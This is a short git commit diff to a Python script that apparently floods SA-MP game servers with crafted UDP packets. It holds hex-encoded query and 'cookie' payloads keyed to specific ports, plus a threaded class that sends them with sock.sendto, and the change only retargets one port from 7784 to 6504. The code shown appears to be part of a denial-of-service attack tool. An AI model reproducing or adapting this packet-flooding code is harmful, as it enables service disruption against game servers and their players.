a0a7b53b1843526eb5a3e9add79d8e9f47afac23
JChristo930 <88033683+JChristo930@users.noreply.github.com>
2021-10-04 00:41:13 -0700

    lunacor.py

--- xnxx.py
+++ xnxx.py
@@ -21,8 +21,8 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e62da","hex_codec"), #cookie port 7796
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
                        codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
+                       codecs.decode("021efd40","hex_codec"),#cookie port 6504
+                       codecs.decode("081e7eda","hex_codec")#cookie port 6504 tambem
                        ]
 
 
@@ -60,7 +60,7 @@ class MyThread(threading.Thread):
                     sock.sendto(Pacotes[4], (ip, int(port)))
                 elif(int(port) == 7771):
                     sock.sendto(Pacotes[6], (ip, int(port)))
-                elif(int(port) == 7784):
+                elif(int(port) == 6504):
                     sock.sendto(Pacotes[7], (ip, int(port)))
                     
                 
